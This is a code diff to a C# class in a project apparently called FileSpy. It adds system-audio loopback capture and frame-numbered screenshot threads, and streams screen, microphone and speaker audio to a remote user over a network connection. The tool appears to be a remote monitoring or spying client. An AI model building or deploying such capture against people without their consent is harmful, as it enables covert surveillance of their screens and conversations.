@@ -1,5 +1,8 @@
-﻿using NAudio.Wave;
+﻿using NAudio.CoreAudioApi;
+using NAudio.Wave;
+using NAudio.Wave.SampleProviders;
 using System;
+using System.Collections.Generic;
 using System.Drawing;
 using System.Drawing.Drawing2D;
 using System.Drawing.Imaging;
@@ -20,15 +23,17 @@ namespace FileSpy.Classes
         bool Connected;
         DateTime LastTime;
 
+        UInt64 FrameID = 0;
+
         public bool VideoStream { get; set; }
-        DateTime LastFPS;
         public int MaxFps { get; set; }
         public long Quality { get; set; }
         public int Size { get; set; }
         public bool Cursor { get; set; }
 
         public WaveInEvent MicroInput { get; set; }
-        public bool AudioStream { get; set; }
+
+        public WasapiLoopbackCapture LoopInput { get; set; }
 
         public delegate void CloseHandler(VideoClass videoClass);
         public event CloseHandler CloseEvent;
@@ -51,6 +56,60 @@ namespace FileSpy.Classes
             MicroInput = new WaveInEvent();
             MicroInput.WaveFormat = new WaveFormat(8000, 16, 1);
             MicroInput.DataAvailable += MicroInput_DataAvailable;
+
+            Connection.SendMessage(new MessageClass(Connection.ID, UserID, Commands.WaveInCount, ID, WaveIn.DeviceCount.ToString()));
+
+            LoopInput = new WasapiLoopbackCapture();
+            LoopInput.DataAvailable += Recorder_DataAvailable;
+            using (var ms = new MemoryStream())
+            {
+                using (var bw = new BinaryWriter(ms))
+                {
+                    //LoopInput.WaveFormat.Serialize(bw);
+                    new WaveFormat(16000, 16, LoopInput.WaveFormat.Channels).Serialize(bw);
+                    Connection.SendMessage(new MessageClass(Connection.ID, UserID, Commands.LoopInfo, ID, ms.ToArray()));
+                }
+            }
+        }
+
+        public void SetDevice(int count)
+        {
+            MicroInput.DeviceNumber = count;
+        }
+
+        private void Recorder_DataAvailable(object sender, WaveInEventArgs e)
+        {
+            try
+            {
+                byte[] result;
+                using (var ms = new MemoryStream())
+                {
+                    ms.Write(e.Buffer, 0, e.BytesRecorded);
+                    ms.Seek(0, SeekOrigin.Begin);
+                    using (var inputStream = new RawSourceWaveStream(ms, LoopInput.WaveFormat))
+                    {
+                        var sampleStream = new WaveToSampleProvider(inputStream);
+                        var resample = new WdlResamplingSampleProvider(sampleStream, 16000);
+                        result = readStream(resample.ToWaveProvider16(), e.BytesRecorded);
+                    }
+                }
+                Connection.SendMessage(new MessageClass(Connection.ID, UserID, Commands.LoopData, ID, result));
+            }
+            catch { }
+        }
+
+        private byte[] readStream(IWaveProvider waveStream, int length)
+        {
+            byte[] buffer = new byte[length];
+            using (var stream = new MemoryStream())
+            {
+                int read;
+                while ((read = waveStream.Read(buffer, 0, length)) > 0)
+                {
+                    stream.Write(buffer, 0, read);
+                }
+                return stream.ToArray();
+            }
         }
 
         private void MicroInput_DataAvailable(object sender, WaveInEventArgs e)
@@ -72,6 +131,7 @@ namespace FileSpy.Classes
 
         private void VideoSender()
         {
+            DateTime LastFPS = DateTime.Now;
             while (Connected)
             {
                 if (VideoStream)
@@ -80,7 +140,16 @@ namespace FileSpy.Classes
                     {
                         LastFPS = DateTime.Now;
 
-                        Connection.SendMessage(new MessageClass(Connection.ID, UserID, Commands.VideoData, ID, TakeImageFrom(Size, Quality, Cursor)));
+                        Thread screen = new Thread(() =>
+                        {
+                            try
+                            {
+                                Connection.SendMessage(new MessageClass(Connection.ID, UserID, Commands.VideoData, ID, TakeImageFrom(Size, Quality, Cursor, FrameID - 1)));
+                            }
+                            catch { }                        
+                        });
+                        FrameID++;
+                        screen.Start();
 
                         while ((DateTime.Now - LastFPS).TotalMilliseconds < 1000 / MaxFps)
                             Thread.Sleep(1);
@@ -91,6 +160,14 @@ namespace FileSpy.Classes
                 {
                     Thread.Sleep(1);
                 }
+            }
+        }
+
+        private void VideoThread()
+        {
+            while (Connected)
+            {
+                Connection.SendMessage(new MessageClass(Connection.ID, UserID, Commands.VideoData, ID, TakeImageFrom(Size, Quality, Cursor, FrameID - 1)));
             }
         }
 
@@ -115,6 +192,7 @@ namespace FileSpy.Classes
             {
                 Connected = false;
                 MicroInput.StopRecording();
+                LoopInput.StopRecording();
                 CloseEvent(this);
             }
         }
@@ -157,7 +235,7 @@ namespace FileSpy.Classes
 
         const Int32 CURSOR_SHOWING = 0x00000001;
 
-        public static byte[] TakeImageFrom(int size, long quality, bool cursor)
+        public static byte[] TakeImageFrom(int size, long quality, bool cursor, UInt64 FrameID)
         {
             using (var ms = new MemoryStream())
             {
@@ -208,7 +286,7 @@ namespace FileSpy.Classes
                         //bitmap.Save(ms, ImageFormat.Jpeg);
                         byte[] data = ms.ToArray();
 
-                        return Zipper(data);
+                        return new VideoData(Zipper(data), FrameID).ToArray();
                     }
                 }
             }
